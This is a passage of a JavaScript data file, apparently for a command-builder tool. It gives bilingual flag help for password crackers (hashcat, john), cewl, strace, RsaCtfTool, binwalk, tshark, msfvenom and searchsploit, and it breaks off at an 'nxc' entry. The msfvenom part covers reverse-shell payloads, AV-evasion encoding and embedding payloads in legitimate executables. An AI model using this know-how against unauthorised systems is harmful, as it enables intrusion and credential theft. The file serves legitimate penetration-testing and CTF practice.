      { id:'_m', flag:'-m', help: M('Hash type (--hash-type). Key ones: 0 MD5, 100 SHA1, 1000 NTLM, 1400 SHA256, 1800 sha512crypt, 3200 bcrypt, 5600 NetNTLMv2, 13100 Kerberos TGS-REP (Kerberoasting), 18200 Kerberos AS-REP (AS-REP Roasting), 16800 WPA-PMKID, 22000 WPA-PBKDF2.', 'Hash type (--hash-type). Key ones: 0 MD5, 100 SHA1, 1000 NTLM, 1400 SHA256, 1800 sha512crypt, 3200 bcrypt, 5600 NetNTLMv2, 13100 Kerberos TGS-REP (Kerberoasting), 18200 Kerberos AS-REP (AS-REP Roasting), 16800 WPA-PMKID, 22000 WPA-PBKDF2.'), value:'1000' },
      { id:'__username', flag:'--username', help: M('Ignore usernames at the start of hash-file lines (user:hash format).', 'Ignore usernames at the start of hash-file lines (user:hash format).') },
      { id:'__hash_info', flag:'--hash-info', help: M('Show help for a specific -m: sample hash, salt type, etc.', 'Show help for a specific -m: sample hash, salt type, etc.') },
      { id:'_a', flag:'-a', help: M('Attack mode (--attack-mode): 0 straight wordlist, 1 combinator (2 wordlists), 3 mask brute-force, 6 hybrid wordlist+mask, 7 hybrid mask+wordlist.', 'Attack mode (--attack-mode): 0 straight wordlist, 1 combinator (2 wordlists), 3 mask brute-force, 6 hybrid wordlist+mask, 7 hybrid mask+wordlist.'), value:'0' },
      { id:'_l_u_d_s', flag:'?l?u?d?s', help: M('Mask placeholders (for -a 3): ?l lowercase a-z, ?u uppercase A-Z, ?d digits 0-9, ?s special characters, ?a everything (?l?u?d?s), ?b byte 0x00-0xff. Example mask: Password?d?d.', 'Mask placeholders (for -a 3): ?l lowercase a-z, ?u uppercase A-Z, ?d digits 0-9, ?s special characters, ?a everything (?l?u?d?s), ?b byte 0x00-0xff. Example mask: Password?d?d.') },
      { id:'_1', flag:'-1', help: M('Custom charset 1 (--custom-charset1..4: -1/-2/-3/-4), then used in the mask as ?1.', 'Custom charset 1 (--custom-charset1..4: -1/-2/-3/-4), then used in the mask as ?1.'), value:'?l?d' },
      { id:'__increment', flag:'--increment', help: M('Increment the mask length (from short to long).', 'Increment the mask length (from short to long).') },
      { id:'__increment_min', flag:'--increment-min', help: M('Minimum mask length with --increment.', 'Minimum mask length with --increment.'), value:'4' },
      { id:'__increment_max', flag:'--increment-max', help: M('Maximum mask length with --increment.', 'Maximum mask length with --increment.'), value:'8' },
      { id:'_r', flag:'-r', help: M('Word-mutation rules file (--rules-file). Repeatable. Classics: best64.rule, d3ad0ne.rule.', 'Word-mutation rules file (--rules-file). Repeatable. Classics: best64.rule, d3ad0ne.rule.'), value:'/usr/share/hashcat/rules/best64.rule' },
      { id:'_o', flag:'-O', help: M('Optimized kernels (--optimized-kernel-enable): noticeably faster, but limits the maximum password length (usually 31).', 'Optimized kernels (--optimized-kernel-enable): noticeably faster, but limits the maximum password length (usually 31).') },
      { id:'_w', flag:'-w', help: M('Workload profile (--workload-profile): 1 low, 2 default, 3 high, 4 nightmare (headless only).', 'Workload profile (--workload-profile): 1 low, 2 default, 3 high, 4 nightmare (headless only).'), value:'3' },
      { id:'_d', flag:'-D', help: M('Device types (--opencl-device-types): 1 CPU, 2 GPU.', 'Device types (--opencl-device-types): 1 CPU, 2 GPU.'), value:'1,2' },
      { id:'__force', flag:'--force', help: M('Ignore warnings (run without a supported GPU, etc.).', 'Ignore warnings (run without a supported GPU, etc.).') },
      { id:'__show', flag:'--show', help: M('Show already cracked hashes from the potfile (compares the hashlist with the potfile) without cracking anything.', 'Show already cracked hashes from the potfile (compares the hashlist with the potfile) without cracking anything.') },
      { id:'__potfile_disable', flag:'--potfile-disable', help: M('Do not use or write the potfile (force a fresh crack).', 'Do not use or write the potfile (force a fresh crack).') },
      { id:'__stdout', flag:'--stdout', help: M('Only generate candidates and print them without cracking (test masks/rules).', 'Only generate candidates and print them without cracking (test masks/rules).') },
      { id:'__session', flag:'--session', help: M('Session name for resuming (--session).', 'Session name for resuming (--session).'), value:'job1' },
      { id:'__restore', flag:'--restore', help: M('Resume an interrupted session (by the name from --session).', 'Resume an interrupted session (by the name from --session).') },
      { id:'__runtime', flag:'--runtime', help: M('Abort after N seconds.', 'Abort after N seconds.'), value:'3600' },
    ],
  },
  {
    id: 'john',
    name: 'john',
    base: 'john',
    desc: M('Классический CPU-крэкер с автоопределением типа хэша и набором *2john. ZIP/SSH/PDF/KeePass и сотни форматов. Незаменим без GPU.', 'The classic CPU password cracker with hash-type autodetection and a rich set of *2john converters. Handles ZIP/SSH/PDF/KeePass and hundreds of hash formats. Indispensable when there is no GPU.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'__wordlist', flag:'--wordlist', help: M('Wordlist attack (--wordlist=FILE). Read candidates from a file.', 'Wordlist attack (--wordlist=FILE). Read candidates from a file.'), value:'/usr/share/wordlists/rockyou.txt' },
      { id:'__rules', flag:'--rules', help: M('Enable word-mutation rules (--rules[=SECTION]). Without a section it is [List.Rules:Wordlist].', 'Enable word-mutation rules (--rules[=SECTION]). Without a section it is [List.Rules:Wordlist].'), value:'Jumbo' },
      { id:'__single', flag:'--single', help: M('Single crack mode: rules based on usernames/GECOS (--single). A fast first pass.', 'Single crack mode: rules based on usernames/GECOS (--single). A fast first pass.') },
      { id:'__incremental', flag:'--incremental', help: M('Incremental brute-force using a Markov model (--incremental[=MODE], default ASCII).', 'Incremental brute-force using a Markov model (--incremental[=MODE], default ASCII).'), value:'ASCII' },
      { id:'__mask', flag:'--mask', help: M('Mask attack (--mask=MASK). Placeholders as in hashcat: ?l ?u ?d ?s ?a.', 'Mask attack (--mask=MASK). Placeholders as in hashcat: ?l ?u ?d ?s ?a.'), value:'?l?l?l?l?d?d' },
      { id:'__loopback', flag:'--loopback', help: M('Take candidates from john.pot (--loopback[=FILE]) - mutations of already cracked passwords.', 'Take candidates from john.pot (--loopback[=FILE]) - mutations of already cracked passwords.') },
      { id:'__format', flag:'--format', help: M('Explicitly set the hash type (--format=NAME): NT, raw-md5, sha512crypt, bcrypt, krb5tgs, etc. Disables autodetection.', 'Explicitly set the hash type (--format=NAME): NT, raw-md5, sha512crypt, bcrypt, krb5tgs, etc. Disables autodetection.'), value:'NT' },
      { id:'__show', flag:'--show', help: M('Show already cracked passwords for the file (--show[=left] - show the UNcracked ones).', 'Show already cracked passwords for the file (--show[=left] - show the UNcracked ones).') },
      { id:'__list', flag:'--list', help: M('Reference lists (--list=WHAT): formats, subformats, build-info, rules.', 'Reference lists (--list=WHAT): formats, subformats, build-info, rules.'), value:'formats' },
      { id:'__test', flag:'--test', help: M('Benchmark formats for N seconds (--test[=TIME]).', 'Benchmark formats for N seconds (--test[=TIME]).'), value:'5' },
      { id:'__fork', flag:'--fork', help: M('Run N parallel processes on CPU cores (--fork=N).', 'Run N parallel processes on CPU cores (--fork=N).'), value:'4' },
      { id:'__node', flag:'--node', help: M('Distributed cracking: range/total (--node=MIN[-MAX]/TOTAL).', 'Distributed cracking: range/total (--node=MIN[-MAX]/TOTAL).'), value:'1-2/4' },
      { id:'__max_run_time', flag:'--max-run-time', help: M('Stop after N seconds.', 'Stop after N seconds.'), value:'3600' },
      { id:'__session', flag:'--session', help: M('Session name for resuming (--session=NAME, .rec file).', 'Session name for resuming (--session=NAME, .rec file).'), value:'job1' },
      { id:'__restore', flag:'--restore', help: M('Resume an interrupted session (--restore[=NAME], default john.rec).', 'Resume an interrupted session (--restore[=NAME], default john.rec).') },
      { id:'__status', flag:'--status', help: M('Show the status of an active/interrupted session (--status[=NAME]).', 'Show the status of an active/interrupted session (--status[=NAME]).') },
      { id:'__pot', flag:'--pot', help: M('Custom potfile for results (--pot=NAME).', 'Custom potfile for results (--pot=NAME).'), value:'custom.pot' },
      { id:'__users', flag:'--users', help: M('Only the specified users/UIDs (--users=[-]LOGIN|UID; minus = exclude).', 'Only the specified users/UIDs (--users=[-]LOGIN|UID; minus = exclude).'), value:'admin' },
      { id:'__stdout', flag:'--stdout', help: M('Only print candidates without checking (--stdout[=LENGTH]) - a word generator.', 'Only print candidates without checking (--stdout[=LENGTH]) - a word generator.') },
    ],
  },
  {
    id: 'hashid',
    name: 'hashid',
    base: 'hashid',
    desc: M('Определяет тип хэша по виду и сразу подсказывает mode hashcat (-m) и формат John (-j). Первый шаг перед крэком: без типа крэкер бесполезен.', 'Identifies a hash type by its appearance and immediately suggests the hashcat mode (-m) and the John format (-j). The first step before any cracking: without the right type the cracker is useless.'),
    targetPlaceholder: '\'{TARGET}\'',
    flags: [
      { id:'__target__', flag:'\'{TARGET}\'', help: M('Hash in quotes (positional). You can pass a path to a file with hashes or feed it via STDIN.', 'Hash in quotes (positional). You can pass a path to a file with hashes or feed it via STDIN.') },
      { id:'_m', flag:'-m', help: M('Show the matching hashcat mode (--mode), the number for the hashcat -m flag.', 'Show the matching hashcat mode (--mode), the number for the hashcat -m flag.') },
      { id:'_j', flag:'-j', help: M('Show the matching John the Ripper format (--john), the name for --format.', 'Show the matching John the Ripper format (--john), the name for --format.') },
      { id:'_e', flag:'-e', help: M('Extended mode (--extended): enable all algorithms, including salted password hashes.', 'Extended mode (--extended): enable all algorithms, including salted password hashes.') },
      { id:'_o', flag:'-o', help: M('Write the result to a file instead of STDOUT (--outfile FILE).', 'Write the result to a file instead of STDOUT (--outfile FILE).'), value:'result.txt' },
      { id:'__help', flag:'--help', help: M('Show help.', 'Show help.') },
    ],
  },
  {
    id: 'cewl',
    name: 'cewl',
    base: 'cewl',
    desc: M('CeWL собирает слова с сайта в свой словарь (имена, термины, продукты). Crunch генерирует словарь по маске/charset. Оба дают целевые списки под жертву.', 'CeWL scrapes words from a target site into a custom wordlist (names, terms, products). Crunch generates a wordlist by mask/charset. Both produce targeted lists for a specific victim.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_d', flag:'-d', help: M('Spider crawl depth (--depth), default 2.', 'Spider crawl depth (--depth), default 2.'), value:'2' },
      { id:'_m', flag:'-m', help: M('Minimum word length (--min_word_length), default 3.', 'Minimum word length (--min_word_length), default 3.'), value:'3' },
      { id:'__with_numbers', flag:'--with-numbers', help: M('Accept words that contain digits.', 'Accept words that contain digits.') },
      { id:'__lowercase', flag:'--lowercase', help: M('Convert all collected words to lowercase.', 'Convert all collected words to lowercase.') },
      { id:'_c', flag:'-c', help: M('Show the frequency of each word (--count).', 'Show the frequency of each word (--count).') },
      { id:'_o', flag:'-o', help: M('Allow the spider to go off to other sites (--offsite).', 'Allow the spider to go off to other sites (--offsite).') },
      { id:'_a', flag:'-a', help: M('Collect metadata from files (--meta).', 'Collect metadata from files (--meta).') },
      { id:'_e', flag:'-e', help: M('Collect email addresses (--email).', 'Collect email addresses (--email).') },
      { id:'__meta_file', flag:'--meta_file', help: M('Separate file for metadata.', 'Separate file for metadata.'), value:'meta.txt' },
      { id:'__email_file', flag:'--email_file', help: M('Separate file for email addresses.', 'Separate file for email addresses.'), value:'emails.txt' },
      { id:'_w', flag:'-w', help: M('Write the wordlist to a file (--write).', 'Write the wordlist to a file (--write).'), value:'wordlist.txt' },
      { id:'_u', flag:'-u', help: M('Custom User-Agent (--ua).', 'Custom User-Agent (--ua).'), value:'Mozilla/5.0' },
      { id:'_v', flag:'-v', help: M('Verbose output (--verbose).', 'Verbose output (--verbose).') },
    ],
  },
  {
    id: 'strace',
    name: 'strace',
    base: 'strace',
    desc: M('strace перехватывает системные вызовы (open, read, connect), ltrace — библиотечные (strcmp, malloc). Динамический разбор: файлы, сеть, сравнения паролей в открытом виде.', 'strace intercepts a program\'s system calls (open, read, connect), ltrace - library calls (strcmp, malloc). Dynamic binary analysis: you see files, network, and password comparisons in the clear.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_f', flag:'-f', help: M('Follow child processes (--follow-forks): fork/vfork/clone.', 'Follow child processes (--follow-forks): fork/vfork/clone.') },
      { id:'_e', flag:'-e', help: M('Call filter (--expression). Groups: trace=file, network, memory, signal, process; or a comma-separated list of names.', 'Call filter (--expression). Groups: trace=file, network, memory, signal, process; or a comma-separated list of names.'), value:'trace=open,read' },
      { id:'_v', flag:'-v', help: M('Full structure output without abbreviation (--no-abbrev).', 'Full structure output without abbreviation (--no-abbrev).') },
      { id:'_target_', flag:'{TARGET}', help: M('The traced binary with its arguments (positional, after the options): strace [options] ./prog args.', 'The traced binary with its arguments (positional, after the options): strace [options] ./prog args.') },
      { id:'_p', flag:'-p', help: M('Attach to an already running process by PID (--attach).', 'Attach to an already running process by PID (--attach).'), value:'1234' },
      { id:'_s', flag:'-s', help: M('Maximum length of printed strings (--string-limit), default 32 - increase it to see passwords in full.', 'Maximum length of printed strings (--string-limit), default 32 - increase it to see passwords in full.'), value:'256' },
      { id:'_y', flag:'-y', help: M('Print paths for file descriptors (--decode-fds).', 'Print paths for file descriptors (--decode-fds).') },
      { id:'_t', flag:'-T', help: M('Show the time spent in each call (--syscall-times).', 'Show the time spent in each call (--syscall-times).') },
      { id:'_k', flag:'-k', help: M('Print the call stack after each syscall (--stack-trace).', 'Print the call stack after each syscall (--stack-trace).') },
      { id:'_c', flag:'-c', help: M('Summary table: count and time per call instead of the full trace (--summary-only).', 'Summary table: count and time per call instead of the full trace (--summary-only).') },
      { id:'_o', flag:'-o', help: M('Write the trace to a file instead of stderr (--output).', 'Write the trace to a file instead of stderr (--output).'), value:'trace.txt' },
      { id:'_ff', flag:'-ff', help: M('With -o: a separate file per PID (trace.txt.PID).', 'With -o: a separate file per PID (trace.txt.PID).') },
    ],
  },
  {
    id: 'sa-tf-ool',
    name: 'RsaCtfTool',
    base: 'RsaCtfTool',
    desc: M('Авто-восстановление слабых RSA-ключей и расшифровка: из публичного ключа (или n/e) гоняет десятки атак (Wiener, Fermat, factordb, Hastad, ROCA и др.) и достаёт private key или plaintext. Рабочая лошадка RSA в CTF.', 'Automatic recovery of weak RSA keys and decryption: from a single public key (or an n/e pair) it runs dozens of attacks (Wiener, Fermat, factordb, Hastad, ROCA, etc.) and extracts the private key or the plaintext. The workhorse for RSA tasks in CTF.'),
    targetPlaceholder: '--publickey {TARGET}',
    flags: [
      { id:'__publickey', flag:'--publickey', help: M('The public RSA key (PEM/DER) being attacked. Supports masks: --publickey "*.pub".', 'The public RSA key (PEM/DER) being attacked. Supports masks: --publickey "*.pub".'), value:'key.pub' },
      { id:'__key', flag:'--key', help: M('Key file for operations like --dumpkey (public or private).', 'Key file for operations like --dumpkey (public or private).'), value:'key.pem' },
      { id:'_n', flag:'-n', help: M('Set the modulus N directly (if there is no key, numbers only). Can be dec or hex.', 'Set the modulus N directly (if there is no key, numbers only). Can be dec or hex.'), value:'0xABC...' },
      { id:'_e', flag:'-e', help: M('Set the public exponent e directly.', 'Set the public exponent e directly.'), value:'65537' },
      { id:'__createpub', flag:'--createpub', help: M('Build a public key (PEM) from the supplied -n and -e and print it.', 'Build a public key (PEM) from the supplied -n and -e and print it.') },
      { id:'__private', flag:'--private', help: M('The main flag: try to recover and print the private key.', 'The main flag: try to recover and print the private key.') },
      { id:'__uncipher', flag:'--uncipher', help: M('Decrypt ciphertext(s) after cracking the key. Multiple values - comma-separated.', 'Decrypt ciphertext(s) after cracking the key. Multiple values - comma-separated.'), value:'0xCIPHER' },
      { id:'__uncipherfile', flag:'--uncipherfile', help: M('Decrypt ciphertext from a file (or files). Multiple paths - comma-separated.', 'Decrypt ciphertext from a file (or files). Multiple paths - comma-separated.'), value:'cipher.bin' },
      { id:'__decryptfile', flag:'--decryptfile', help: M('Decrypt a file encrypted with the recovered private key (alternate name for file decryption).', 'Decrypt a file encrypted with the recovered private key (alternate name for file decryption).'), value:'cipher.enc' },
      { id:'__output', flag:'--output', help: M('Save the result (the recovered key) to the specified file.', 'Save the result (the recovered key) to the specified file.'), value:'priv.pem' },
      { id:'__attack', flag:'--attack', help: M('Run a specific attack instead of all of them (wiener, fermat, factordb, hastads, boneh_durfee, pollard_p_1, ecm, etc.). all - run all.', 'Run a specific attack instead of all of them (wiener, fermat, factordb, hastads, boneh_durfee, pollard_p_1, ecm, etc.). all - run all.'), value:'wiener' },
      { id:'__timeout', flag:'--timeout', help: M('Timeout (sec) per attack - so that long factorizations do not hang forever.', 'Timeout (sec) per attack - so that long factorizations do not hang forever.'), value:'60' },
      { id:'__ecmdigits', flag:'--ecmdigits', help: M('Expected number of digits of the factor for ECM factorization (speeds up ecm).', 'Expected number of digits of the factor for ECM factorization (speeds up ecm).'), value:'25' },
      { id:'__isroca', flag:'--isroca', help: M('Check whether the key is vulnerable to ROCA (CVE-2017-15361, weak Infineon keys).', 'Check whether the key is vulnerable to ROCA (CVE-2017-15361, weak Infineon keys).') },
      { id:'__dumpkey', flag:'--dumpkey', help: M('Print the numeric key parameters (n, e, and for a private key - d, p, q).', 'Print the numeric key parameters (n, e, and for a private key - d, p, q).') },
      { id:'__ext', flag:'--ext', help: M('Together with --dumpkey, show the extended CRT parameters (dp, dq, qinv).', 'Together with --dumpkey, show the extended CRT parameters (dp, dq, qinv).') },
      { id:'__convert_idrsa_pub', flag:'--convert_idrsa_pub', help: M('Convert an SSH key (id_rsa.pub) to PEM format.', 'Convert an SSH key (id_rsa.pub) to PEM format.') },
      { id:'__verbose', flag:'--verbose', help: M('Verbose output of the attack progress (useful to understand exactly what worked).', 'Verbose output of the attack progress (useful to understand exactly what worked).') },
    ],
  },
  {
    id: 'binwalk',
    name: 'binwalk',
    base: 'binwalk',
    desc: M('Сканирует файл по сигнатурам: вложенные файлы, архивы, FS, прошивки — и автоматически извлекает. Незаменим в CTF stego и reverse прошивок.', 'Scans a file by signatures and finds embedded files, archives, file systems, and firmware images, then extracts them automatically. Indispensable for CTF stego and firmware reversing: pulls out what is hidden inside images/dumps.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_b', flag:'-B', help: M('Scan by signatures of known files (the default mode for classic binwalk).', 'Scan by signatures of known files (the default mode for classic binwalk).') },
      { id:'_a', flag:'-A', help: M('Scan for opcode signatures of executable code (determine the architecture).', 'Scan for opcode signatures of executable code (determine the architecture).') },
      { id:'_r', flag:'-R', help: M('Search for a given byte sequence (raw signature), e.g. PK = ZIP.', 'Search for a given byte sequence (raw signature), e.g. PK = ZIP.'), value:'\\x50\\x4b\\x03\\x04' },
      { id:'_y', flag:'-Y', help: M('Determine the CPU architecture from the machine code (capstone).', 'Determine the CPU architecture from the machine code (capstone).') },
      { id:'_e', flag:'-e', help: M('Automatically extract all recognized file types into the _<file>.extracted subfolder.', 'Automatically extract all recognized file types into the _<file>.extracted subfolder.') },
      { id:'__dd', flag:'--dd', help: M('Extract signatures by mask type[:ext[:cmd]] (regex by type, give an extension, run a command).', 'Extract signatures by mask type[:ext[:cmd]] (regex by type, give an extension, run a command).'), value:'png:png' },
      { id:'_m', flag:'-M', help: M('Matryoshka: recursively scan the already extracted files (nesting).', 'Matryoshka: recursively scan the already extracted files (nesting).') },
      { id:'_d', flag:'-d', help: M('Limit the recursion depth for -M.', 'Limit the recursion depth for -M.'), value:'8' },
      { id:'_c', flag:'-C', help: M('Extract files into the specified folder.', 'Extract files into the specified folder.'), value:'out_dir' },
      { id:'_j', flag:'-J', help: M('Save the entropy plot as PNG.', 'Save the entropy plot as PNG.') },
      { id:'_n', flag:'-N', help: M('Do not plot, only print the entropy rise/fall points.', 'Do not plot, only print the entropy rise/fall points.') },
      { id:'_x', flag:'-x', help: M('Exclude results matching the string (exclude).', 'Exclude results matching the string (exclude).'), value:'invalid' },
      { id:'_l', flag:'-l', help: M('Write results to a log file (JSON in binwalk3).', 'Write results to a log file (JSON in binwalk3).'), value:'results.json' },
      { id:'_q', flag:'-q', help: M('Quiet mode - suppress output to stdout.', 'Quiet mode - suppress output to stdout.') },
      { id:'_v', flag:'-v', help: M('Verbose output (in binwalk3 it shows all results during recursion).', 'Verbose output (in binwalk3 it shows all results during recursion).') },
    ],
  },
  {
    id: 'tshark',
    name: 'tshark',
    base: 'tshark',
    desc: M('Разбор захваченного трафика: фильтры, статистика по протоколам/сессиям, извлечение файлов и потоков. tshark — консольный Wireshark для скриптов и CTF PCAP.', 'Analysis of captured traffic: packet filtering, statistics by protocol and conversation, extraction of transferred files and streams. tshark is the console Wireshark for scripts and CTF PCAPs where you need to pull a flag out of HTTP/DNS/USB traffic.'),
    targetPlaceholder: '-r {TARGET}',
    flags: [
      { id:'_r', flag:'-r', help: M('Read packets from a file (pcap/pcapng). The main mode for analyzing a dump.', 'Read packets from a file (pcap/pcapng). The main mode for analyzing a dump.'), value:'capture.pcap' },
      { id:'_i', flag:'-i', help: M('Live capture from an interface (or a pipe).', 'Live capture from an interface (or a pipe).'), value:'eth0' },
      { id:'_c', flag:'-c', help: M('Read/capture at most N packets and stop.', 'Read/capture at most N packets and stop.'), value:'100' },
      { id:'_w', flag:'-w', help: M('Write raw packets to a file (for capture or a filtered selection).', 'Write raw packets to a file (for capture or a filtered selection).'), value:'out.pcapng' },
      { id:'_y', flag:'-Y', help: M('Wireshark display filter (applied after parsing): http, dns, ip.addr==x, tcp.port==80.', 'Wireshark display filter (applied after parsing): http, dns, ip.addr==x, tcp.port==80.'), value:'http.request' },
      { id:'_f', flag:'-f', help: M('Capture filter in BPF syntax (applied at capture, before parsing).', 'Capture filter in BPF syntax (applied at capture, before parsing).'), value:'tcp port 80' },
      { id:'_2', flag:'-2', help: M('Two-pass analysis - needed for fields that depend on future packets (e.g. responses).', 'Two-pass analysis - needed for fields that depend on future packets (e.g. responses).') },
      { id:'_n', flag:'-n', help: M('Do not resolve names (hosts/ports) - faster and cleaner output.', 'Do not resolve names (hosts/ports) - faster and cleaner output.') },
      { id:'_z', flag:'-z', help: M('Statistics. io,phs - protocol hierarchy; conv,tcp - conversations; endpoints,ip - hosts; follow,tcp,ascii,0 - a stream.', 'Statistics. io,phs - protocol hierarchy; conv,tcp - conversations; endpoints,ip - hosts; follow,tcp,ascii,0 - a stream.'), value:'io,phs' },
      { id:'__export_objects', flag:'--export-objects', help: M('Pull all transferred protocol objects (http/smb/tftp/imf) into a folder.', 'Pull all transferred protocol objects (http/smb/tftp/imf) into a folder.'), value:'http,out_dir' },
      { id:'_q', flag:'-q', help: M('Quiet mode: do not print packets line by line, show only the final statistics (-z).', 'Quiet mode: do not print packets line by line, show only the final statistics (-z).') },
      { id:'_t', flag:'-T', help: M('Output format: fields (fields via -e), json, pdml, ek, text. For parsing - fields/json.', 'Output format: fields (fields via -e), json, pdml, ek, text. For parsing - fields/json.'), value:'fields' },
      { id:'_e', flag:'-e', help: M('Which field to output (repeatable). Works with -T fields: http.host, dns.qry.name, ip.src.', 'Which field to output (repeatable). Works with -T fields: http.host, dns.qry.name, ip.src.'), value:'http.host' },
      { id:'_x', flag:'-x', help: M('Hex+ASCII dump of each packet\'s contents.', 'Hex+ASCII dump of each packet\'s contents.') },
      { id:'_v', flag:'-V', help: M('Full packet detail (expand all layers).', 'Full packet detail (expand all layers).') },
    ],
  },
  {
    id: 'msfvenom',
    name: 'msfvenom',
    base: 'msfvenom',
    desc: M('Собирает shellcode и payload (reverse/bind shell, meterpreter) под любую ОС/архитектуру/формат, с encoding против AV/badchars. Главный генератор payload для эксплойтов и pivoting.', 'Creates standalone shellcode and payloads (reverse/bind shell, meterpreter) for any OS, architecture, and file format, with encoding to bypass AV/badchars. The main payload generator for exploits and pivoting.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'_p', flag:'-p', help: M('Which payload to build. Examples: linux/x64/shell_reverse_tcp, php/meterpreter_reverse_tcp, windows/x64/meterpreter/reverse_tcp.', 'Which payload to build. Examples: linux/x64/shell_reverse_tcp, php/meterpreter_reverse_tcp, windows/x64/meterpreter/reverse_tcp.'), value:'windows/x64/meterpreter/reverse_tcp' },
      { id:'_l', flag:'-l', help: M('List of modules: payloads, encoders, nops, formats, platforms, all.', 'List of modules: payloads, encoders, nops, formats, platforms, all.'), value:'payloads' },
      { id:'__list_options', flag:'--list-options', help: M('Show all options (LHOST, LPORT, etc.) for the payload selected via -p.', 'Show all options (LHOST, LPORT, etc.) for the payload selected via -p.') },
      { id:'lhost', flag:'LHOST', help: M('The attacker\'s IP that the reverse shell connects back to (a payload option, space-separated).', 'The attacker\'s IP that the reverse shell connects back to (a payload option, space-separated).'), value:'{LHOST}' },
      { id:'lport', flag:'LPORT', help: M('The attacker\'s port for the reverse connection.', 'The attacker\'s port for the reverse connection.'), value:'443' },
      { id:'rhost', flag:'RHOST', help: M('The victim\'s IP for bind payloads (where the shell listens).', 'The victim\'s IP for bind payloads (where the shell listens).'), value:'{TARGET}' },
      { id:'_f', flag:'-f', help: M('Output format: exe, elf, raw, dll, asp, aspx, war, psh, py, c, hex, macho (see -l formats).', 'Output format: exe, elf, raw, dll, asp, aspx, war, psh, py, c, hex, macho (see -l formats).'), value:'exe' },
      { id:'_a', flag:'-a', help: M('Architecture: x86, x64, armle, mipsle, etc.', 'Architecture: x86, x64, armle, mipsle, etc.'), value:'x64' },
      { id:'__platform', flag:'--platform', help: M('Target platform: windows, linux, osx, android, php, python.', 'Target platform: windows, linux, osx, android, php, python.'), value:'windows' },
      { id:'_o', flag:'-o', help: M('Save the payload to a file (otherwise it is printed to stdout).', 'Save the payload to a file (otherwise it is printed to stdout).'), value:'shell.exe' },
      { id:'_e', flag:'-e', help: M('Encoder for payload obfuscation (classic: x86/shikata_ga_nai).', 'Encoder for payload obfuscation (classic: x86/shikata_ga_nai).'), value:'x86/shikata_ga_nai' },
      { id:'_i', flag:'-i', help: M('How many times to run the payload through the encoder (iterations).', 'How many times to run the payload through the encoder (iterations).'), value:'3' },
      { id:'_b', flag:'-b', help: M('Forbidden bytes (badchars) to avoid in the payload.', 'Forbidden bytes (badchars) to avoid in the payload.'), value:'\\x00\\x0a\\x0d' },
      { id:'_n', flag:'-n', help: M('Prepend a NOP sled of the given length before the payload.', 'Prepend a NOP sled of the given length before the payload.'), value:'16' },
      { id:'_s', flag:'-s', help: M('Maximum size of the resulting payload (bytes).', 'Maximum size of the resulting payload (bytes).'), value:'400' },
      { id:'_x', flag:'-x', help: M('Use an existing executable as a template (embed the payload into a legitimate exe).', 'Use an existing executable as a template (embed the payload into a legitimate exe).'), value:'calc.exe' },
      { id:'_k', flag:'-k', help: M('Preserve the template\'s behavior: run the payload in a separate thread (with -x).', 'Preserve the template\'s behavior: run the payload in a separate thread (with -x).') },
      { id:'_c', flag:'-c', help: M('Add additional win32 shellcode from a file.', 'Add additional win32 shellcode from a file.'), value:'shell.bin' },
      { id:'__smallest', flag:'--smallest', help: M('Generate the smallest possible payload by size.', 'Generate the smallest possible payload by size.') },
      { id:'_v', flag:'-v', help: M('Variable name for output formats like c/python/csharp.', 'Variable name for output formats like c/python/csharp.'), value:'buf' },
    ],
  },
  {
    id: 'searchsploit',
    name: 'searchsploit',
    base: 'searchsploit',
    desc: M('Офлайн-поиск по локальной копии Exploit-DB: по ПО/версии или CVE находит эксплойты, путь, открывает и копирует. Быстрый PoC под найденный сервис.', 'Offline search of a local copy of Exploit-DB: by software name/version or CVE it finds ready exploits, shows their path, opens and copies them to you. A fast way to find a PoC for a discovered vulnerable service.'),
    targetPlaceholder: '\'{TARGET}\'',
    flags: [
      { id:'_t', flag:'-t', help: M('Search only in the exploit title (by default - title AND path).', 'Search only in the exploit title (by default - title AND path).') },
      { id:'_e', flag:'-e', help: M('Exact word-order match in the title (exact match).', 'Exact word-order match in the title (exact match).'), value:'"Apache 2.4"' },
      { id:'_s', flag:'-s', help: M('Strict search: all entered values must be present, no fuzzy matching.', 'Strict search: all entered values must be present, no fuzzy matching.') },
      { id:'_c', flag:'-c', help: M('Case-sensitive search (case is ignored by default).', 'Case-sensitive search (case is ignored by default).') },
      { id:'__cve', flag:'--cve', help: M('Search for exploits tied to the specified CVE.', 'Search for exploits tied to the specified CVE.'), value:'2021-44228' },
      { id:'__exclude', flag:'--exclude', help: M('Remove entries from the results by strings (multiple via |).', 'Remove entries from the results by strings (multiple via |).'), value:'"/dos/|PoC"' },
      { id:'_m', flag:'-m', help: M('Copy (mirror) an exploit by EDB-ID or path into the current folder.', 'Copy (mirror) an exploit by EDB-ID or path into the current folder.'), value:'39446' },
      { id:'_x', flag:'-x', help: M('Open (examine) an exploit in $PAGER for viewing.', 'Open (examine) an exploit in $PAGER for viewing.'), value:'39446' },
      { id:'_p', flag:'-p', help: M('Show the full path to the exploit file (and copy the path to the clipboard).', 'Show the full path to the exploit file (and copy the path to the clipboard).'), value:'39446' },
      { id:'__nmap', flag:'--nmap', help: M('Run against Nmap results from XML (a scan with -sV is needed) and find exploits for the services.', 'Run against Nmap results from XML (a scan with -sV is needed) and find exploits for the services.'), value:'scan.xml' },
      { id:'_u', flag:'-u', help: M('Check for and install updates to the exploitdb database (git/deb).', 'Check for and install updates to the exploitdb database (git/deb).') },
      { id:'_j', flag:'-j', help: M('Output the results as JSON (handy to pipe into jq).', 'Output the results as JSON (handy to pipe into jq).') },
      { id:'_w', flag:'-w', help: M('Show URLs to Exploit-DB.com instead of the local path.', 'Show URLs to Exploit-DB.com instead of the local path.') },
      { id:'_o', flag:'-o', help: M('Allow titles to extend beyond the column width (overflow, long names).', 'Allow titles to extend beyond the column width (overflow, long names).') },
      { id:'__id', flag:'--id', help: M('Show the EDB-ID instead of the local path.', 'Show the EDB-ID instead of the local path.') },
      { id:'_v', flag:'-v', help: M('Verbose output (verbose).', 'Verbose output (verbose).') },
      { id:'__disable_colour', flag:'--disable-colour', help: M('Disable color highlighting (for logs/pipes).', 'Disable color highlighting (for logs/pipes).') },
    ],
  },
  {
    id: 'nxc',
    name: 'nxc',
    base: 'nxc',
